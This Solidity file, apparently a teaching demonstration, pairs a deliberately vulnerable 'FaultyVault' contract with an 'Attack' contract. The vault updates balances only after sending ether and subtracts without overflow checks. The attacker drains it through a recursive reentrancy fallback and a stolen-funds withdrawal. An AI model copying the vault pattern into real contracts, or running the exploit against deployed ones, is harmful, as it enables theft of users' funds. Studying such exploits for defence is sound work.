pragma solidity ^0.8.16;

contract FaultyVault {

  mapping (address => uint) public credit;
    
  function deposit(address to) payable public{
    credit[to] += msg.value;
  }
    
  function withdraw(uint amount) public{
    if (credit[msg.sender] >= amount) {
			(bool success, ) = msg.sender.call{value: amount}("");
      require(success);
      unchecked{
        credit[msg.sender] -= amount;
      }
    }
  }

  function queryCredit(address to) view public returns(uint){
    return credit[to];
  }
}

contract Attack {
    FaultyVault vault;

    constructor(address _vaultAddress) {
        vault = FaultyVault(_vaultAddress);
    }

    // Start the attack by depositing and then triggering the recursive withdrawal
    function attack() external payable {
        vault.deposit{value: msg.value}(address(this));
        vault.withdraw(msg.value);
    }

    // Fallback function to execute the reentrancy attack
    fallback() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw(msg.value);
        }
    }

    // To withdraw stolen funds after attack
    function withdrawStolenFunds() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
